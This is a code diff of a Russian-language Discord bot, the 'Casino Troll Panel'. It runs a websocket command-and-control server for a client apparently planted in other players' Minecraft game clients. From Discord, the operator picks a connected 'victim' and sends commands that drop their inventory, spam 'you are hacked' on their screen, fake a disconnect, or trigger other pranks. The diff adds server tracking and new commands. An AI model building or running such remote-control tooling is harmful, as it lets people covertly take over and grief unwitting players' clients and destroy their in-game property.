@@ -13,14 +13,19 @@ WS_PORT = 8765
 intents = discord.Intents.default()
 bot = commands.Bot(command_prefix="!", intents=intents)
 
-connected_players: dict[str, websockets.asyncio.server.ServerConnection] = {}
+# nick -> {"ws": ..., "server": ...}
+connected_players: dict[str, dict] = {}
 troll_message: discord.Message = None
 
 
-def make_embed(players: list[str]) -> discord.Embed:
+def make_embed(players: dict) -> discord.Embed:
     embed = discord.Embed(title="🎰 Casino Troll Panel", color=0xFF4444)
     if players:
-        embed.add_field(name="🟢 Онлайн", value="\n".join(f"• `{p}`" for p in players), inline=False)
+        lines = []
+        for nick, info in players.items():
+            server = info.get("server", "???")
+            lines.append(f"• `{nick}` — {server}")
+        embed.add_field(name="🟢 Онлайн", value="\n".join(lines), inline=False)
     else:
         embed.add_field(name="🔴 Онлайн", value="Никого нет", inline=False)
     embed.set_footer(text="Выбери игрока и нажми кнопку")
@@ -40,102 +45,60 @@ class PlayerSelect(discord.ui.Select):
         await interaction.response.send_message(f"✅ Выбран: `{self.values[0]}`", ephemeral=True)
 
 
-# Модальное окно для выброса предметов
 class DropModal(discord.ui.Modal, title="Выбросить предметы"):
-    slot = discord.ui.TextInput(
-        label="Слот (0-35, или 'all' для всех)",
-        placeholder="Например: 0 или all",
-        default="all",
-        max_length=10
-    )
-    amount = discord.ui.TextInput(
-        label="Количество (1-64, или 'all')",
-        placeholder="Например: 32 или all",
-        default="all",
-        max_length=5
-    )
+    slot = discord.ui.TextInput(label="Слот (0-35 или 'all')", default="all", max_length=10)
+    amount = discord.ui.TextInput(label="Количество (1-64 или 'all')", default="all", max_length=5)
 
     async def on_submit(self, interaction: discord.Interaction):
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Игрок не выбран или офлайн!", ephemeral=True)
+            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True)
             return
-
         slot_val = self.slot.value.strip().lower()
         amount_val = self.amount.value.strip().lower()
-
-        # Валидация слота
         if slot_val != "all":
             try:
                 s = int(slot_val)
                 if not 0 <= s <= 35:
-                    await interaction.response.send_message("❌ Слот должен быть от 0 до 35!", ephemeral=True)
+                    await interaction.response.send_message("❌ Слот 0-35!", ephemeral=True)
                     return
             except ValueError:
                 await interaction.response.send_message("❌ Неверный слот!", ephemeral=True)
                 return
-
-        # Валидация количества
         if amount_val != "all":
             try:
                 a = int(amount_val)
                 if not 1 <= a <= 64:
-                    await interaction.response.send_message("❌ Количество должно быть от 1 до 64!", ephemeral=True)
+                    await interaction.response.send_message("❌ Количество 1-64!", ephemeral=True)
                     return
             except ValueError:
                 await interaction.response.send_message("❌ Неверное количество!", ephemeral=True)
                 return
-
         cmd = f"drop:{slot_val}:{amount_val}"
-        try:
-            await connected_players[player].send(cmd)
-            desc = f"слот {slot_val}" if slot_val != "all" else "все слоты"
-            amt = f"{amount_val} шт." if amount_val != "all" else "всё"
-            await interaction.response.send_message(
-                f"✅ Выброс → `{player}` | {desc} | {amt}", ephemeral=True
-            )
-        except Exception as e:
-            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
+        await connected_players[player]["ws"].send(cmd)
+        await interaction.response.send_message(f"✅ Выброс → `{player}` слот {slot_val} x{amount_val}", ephemeral=True)
 
 
-# Модальное окно для спама
 class SpamModal(discord.ui.Modal, title="Спам на экране"):
-    message = discord.ui.TextInput(
-        label="Сообщение",
-        placeholder="Текст который увидит жертва",
-        default="ТЫ ВЗЛОМАН 😈",
-        max_length=50
-    )
-    count = discord.ui.TextInput(
-        label="Количество повторений (1-30)",
-        placeholder="Например: 10",
-        default="10",
-        max_length=3
-    )
+    message = discord.ui.TextInput(label="Сообщение", default="ТЫ ВЗЛОМАН 😈", max_length=50)
+    count = discord.ui.TextInput(label="Повторений (1-30)", default="10", max_length=3)
 
     async def on_submit(self, interaction: discord.Interaction):
         player = getattr(bot, "selected_player", None)
         if not player or player not in connected_players:
-            await interaction.response.send_message("❌ Игрок не выбран или офлайн!", ephemeral=True)
+            await interaction.response.send_message("❌ Игрок не выбран!", ephemeral=True)
             return
-
         try:
             c = int(self.count.value.strip())
             if not 1 <= c <= 30:
-                await interaction.response.send_message("❌ Повторений должно быть от 1 до 30!", ephemeral=True)
+                await interaction.response.send_message("❌ Повторений 1-30!", ephemeral=True)
                 return
         except ValueError:
             await interaction.response.send_message("❌ Неверное число!", ephemeral=True)
             return
-
         cmd = f"spam:{self.message.value}:{c}"
-        try:
-            await connected_players[player].send(cmd)
-            await interaction.response.send_message(
-                f"✅ Спам → `{player}` | `{self.message.value}` x{c}", ephemeral=True
-            )
-        except Exception as e:
-            await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
+        await connected_players[player]["ws"].send(cmd)
+        await interaction.response.send_message(f"✅ Спам → `{player}` | `{self.message.value}` x{c}", ephemeral=True)
 
 
 class TrollView(discord.ui.View):
@@ -149,7 +112,7 @@ class TrollView(discord.ui.View):
             await interaction.response.send_message("❌ Сначала выбери игрока!", ephemeral=True)
             return
         try:
-            await connected_players[player].send(cmd)
+            await connected_players[player]["ws"].send(cmd)
             await interaction.response.send_message(f"✅ `{label}` → `{player}`", ephemeral=True)
         except Exception as e:
             await interaction.response.send_message(f"❌ Ошибка: {e}", ephemeral=True)
@@ -178,10 +141,18 @@ class TrollView(discord.ui.View):
     async def fakedisco(self, interaction, button):
         await self.send_cmd(interaction, "fakedisco", "Фейк-дисконнект")
 
-    @discord.ui.button(label="🔄 Обновить список", style=discord.ButtonStyle.success, row=3)
+    @discord.ui.button(label="🍌 Бананчик", style=discord.ButtonStyle.danger, row=3)
+    async def banana(self, interaction, button):
+        await self.send_cmd(interaction, "banana", "Бананчик запущен")
+
+    @discord.ui.button(label="🧯 Огнетушитель", style=discord.ButtonStyle.primary, row=3)
+    async def extinguisher(self, interaction, button):
+        await self.send_cmd(interaction, "extinguisher", "Огнетушитель!")
+
+    @discord.ui.button(label="🔄 Обновить список", style=discord.ButtonStyle.success, row=4)
     async def refresh(self, interaction, button):
         await interaction.response.edit_message(
-            embed=make_embed(list(connected_players.keys())),
+            embed=make_embed(connected_players),
             view=TrollView()
         )
 
@@ -190,10 +161,7 @@ async def update_panel():
     global troll_message
     if troll_message:
         try:
-            await troll_message.edit(
-                embed=make_embed(list(connected_players.keys())),
-                view=TrollView()
-            )
+            await troll_message.edit(embed=make_embed(connected_players), view=TrollView())
         except:
             pass
 
@@ -205,8 +173,9 @@ async def ws_handler(ws):
             data = json.loads(raw)
             if data.get("type") == "hello":
                 nick = data["nick"]
-                connected_players[nick] = ws
-                print(f"[WS] Подключился: {nick}")
+                server = data.get("server", "???")
+                connected_players[nick] = {"ws": ws, "server": server}
+                print(f"[WS] Подключился: {nick} @ {server}")
                 await update_panel()
     except Exception as e:
         print(f"[WS] Ошибка: {e}")
@@ -227,11 +196,9 @@ async def start_ws_server():
 async def on_ready():
     global troll_message
     print(f"[Bot] Запущен как {bot.user}")
-
     channel = bot.get_channel(TROLL_CHANNEL_ID)
     if channel:
-        troll_message = await channel.send(embed=make_embed([]), view=TrollView())
-
+        troll_message = await channel.send(embed=make_embed({}), view=TrollView())
     asyncio.create_task(start_ws_server())
 
 
